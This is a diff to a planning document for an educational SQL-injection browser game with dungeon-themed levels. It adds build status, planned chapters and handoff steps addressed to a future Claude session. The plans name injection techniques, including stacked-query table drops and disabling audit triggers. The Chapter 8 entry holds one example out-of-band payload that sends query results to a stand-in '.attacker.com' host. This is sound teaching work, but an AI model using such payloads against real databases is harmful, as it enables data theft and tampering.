@@ -145,4 +145,63 @@ Each chapter is independently shippable.
 
 ---
 
+## 11. Build Status — Session Handoff (as of 2026-04-24)
+
+### ✅ Done
+
+| Area | Status | Notes |
+|---|---|---|
+| Arcane-terminal theme | ✅ | Phosphor green + parchment + gold + amber; Cinzel + IBM Plex Mono; scanline overlay; scrollbar styled. |
+| 3-column layout | ✅ | Spellbook / Dungeon / Combat Log + nav + stat bar + phase bar. |
+| Stat bar | ✅ | HP/MP/XP/Stealth/Insight + chapter label. |
+| Stats tab (growth rules) | ✅ | Visible tab explains how each stat grows. |
+| Modal system | ✅ | For cheatsheet + defense cards. |
+| Save/load | ✅ | `localStorage` key `sqli-dungeon.save.v1`. Survives refresh. |
+| Turn state machine | ✅ | Recon → Craft → Cast → Loot. `advance()` routes based on phase. |
+| d20 + skill checks | ✅ | `skillCheck(stat, dc)` with nat 20 / nat 1 rules. WAF check = Stealth vs DC 12 by default. |
+| Payload builder | ✅ | Textarea + clickable tokens in Spellbook. Locked tokens greyed until unlocked. |
+| Cheatsheet gating | ✅ | Definitions hidden during active levels, visible in sandbox (`state.level === 99`). |
+| Hint system | ✅ | Pulls per-level hints, advances through them. |
+| Dungeon map canvas | ✅ | 6 nodes per chapter (5 levels + sandbox), bezier edges, locked/unlocked/active/cleared states, clickable, hover detail. |
+| Chapter auto-advance | ✅ | Clearing last level of a chapter unlocks next chapter, +2 maxHP, full heal. |
+| **Chapter 1: Auth Bypass** | ✅ | 5 levels (Wooden Door, Iron Gate, Rune Lock, Silent Guard, Captain's Cipher) + sandbox generator. |
+| **Chapter 2: Error-Based** | ✅ | 5 levels (Loose Tongue, Extracted Truth, XML Trick, Cast of Lies, Hash Exposed) + sandbox. |
+| **Chapter 3: UNION-Based** | ✅ | 5 levels (Count the Pillars, Where the Text Sits, Name of the Realm, Atlas, Dump) + sandbox. |
+
+### 🔨 Remaining
+
+| Area | Priority | Notes for next session |
+|---|---|---|
+| **Chapter 4: Boolean-Based Blind** | Next | 5 levels. Idea progression: detect true/false response shape → infer single char via `SUBSTRING`+`ASCII` → extract DB name → extract table name → extract admin password char-by-char. Sandbox: random char target. Teach binary search as the optimization. |
+| **Chapter 5: Time-Based Blind** | High | Same arc but with `SLEEP(n)` / `WAITFOR DELAY`. Simulate "response took >3s" in the engine — just pattern-match for `SLEEP` / `pg_sleep` / `WAITFOR` with a numeric arg. Introduce Insight rolls for blind-inference accuracy. |
+| **Chapter 6: Stacked Queries** | Med | `;` separated statements. Require the game to model different DBs — MSSQL/Postgres allow stacking, MySQL often doesn't. Levels: drop a table, insert admin row, disable audit trigger, call `xp_cmdshell`-style fake RCE, clean up. |
+| **Chapter 7: Second-Order** | Med | Two-step: Stage 1 store payload (e.g., signup form), Stage 2 trigger it later (profile page re-queries with stored value, unsanitized). Engine needs a "stored payload" slot that a later level reads. Easiest: two phases inside one level, or two linked levels. |
+| **Chapter 8: Out-of-Band (OOB)** | Med | Simulate DNS/HTTP exfil. Payloads like `LOAD_FILE(CONCAT('\\\\\\\\',(SELECT…),'.attacker.com'))`. Engine just needs to pattern-match for OOB functions + a subquery. Narrate "your Burp Collaborator lights up." |
+| **NoSQL bonus** | Low | MongoDB-style `{ $ne: null }`, `$gt`/`$where`, JS injection in `$where`. Endpoint input is JSON, so payload builder should allow raw JSON. |
+| **Boss dungeon** | Low | Multi-class. One encounter requiring chained techniques (e.g., UNION to find column, Boolean blind to find admin id, Time-based to confirm hash). State tracks sub-goals. |
+| **Sprite art** | Low | User approved. Small pixel sprites per vuln class (spider/ghost/dragon/etc.) on nodes. Inline SVG or PNG base64 — keep single-file. |
+| **Nav link update** | Polish | `index.html` + `neural-heatmap.html` + `tutorial-*.html` reference "Attack Surface" — rename to "SQLi Dungeon" in their nav bars. |
+| **Asset extraction** | Polish | If `aws-attack-surface.html` grows past ~3000 lines, pull `CHAPTERS` into `assets/sqli-levels.js` and `<script src>`-include it. Not needed yet. |
+
+### 🧭 How to Continue (for the next Claude session)
+
+1. **Open**: `C:\Users\mercu\Claude\neural-heatmap\aws-attack-surface.html`.
+2. **Find the anchor**: search for `// Chapters 4 – 8 + NoSQL bonus still to author`. That's exactly where new chapter entries go inside the `CHAPTERS` object.
+3. **Author pattern**: every chapter object needs `{ id, name, class, intro, levels: { 1..5 }, sandbox(seed) }`. Every level needs `{ id, name, endpoint, query, field, goal, reconNotes[], hints[], check(payload)→{ok, narrate}, unlockTokens[], defense: { title, body, code, tip } }`. Use Chapters 1–3 as templates.
+4. **`check(payload)` rules**: return `{ ok: true, narrate }` for full success, `{ ok: 'partial', narrate }` for credit-but-messy, `{ ok: false, narrate }` for failure. The engine already handles XP, defense card, phase routing.
+5. **Tokens**: add new tokens to the `KNOWN_TOKENS` array near the top of the script, then reference them in `unlockTokens` per level. They appear locked until a level unlocks them.
+6. **Commit cadence**: one chapter per commit; push after each. Commit messages have been `"Chapter N: Topic (5 levels + sandbox)"`.
+7. **Testing locally**: just open `aws-attack-surface.html` in a browser. No build step. localStorage persists progress — clear it via DevTools if you want a fresh run.
+8. **If levels grow too heavy**: extract `CHAPTERS` to `assets/sqli-levels.js` and `<script src="assets/sqli-levels.js"></script>` *before* the main script. Don't do this prematurely.
+9. **DO NOT** rewrite scaffold, theme, or engine — they are settled. Only add to `CHAPTERS` and polish.
+
+### 🐛 Known limitations
+
+- The `mulberry32` seeded RNG is deterministic per seed — re-rolling the sandbox generates a new seed, but the same seed will always produce the same encounter. This is intentional so students can share seeds.
+- `check()` functions use regex against the payload string — they approve any payload that matches the shape, not just the exact "canonical" payload. That's fine for learning (rewards creative solutions) but a determined student can pass with a borderline match. Tighten regexes if that matters.
+- No audio / no animations beyond CSS transitions. Scope choice.
+- Cheatsheet definitions are hardcoded in `showCheatsheet()`. If the token list grows, move definitions next to the tokens themselves.
+
+---
+
 *Edit this file to redirect the build. Anything marked "Open question" is a nudge for your call.*
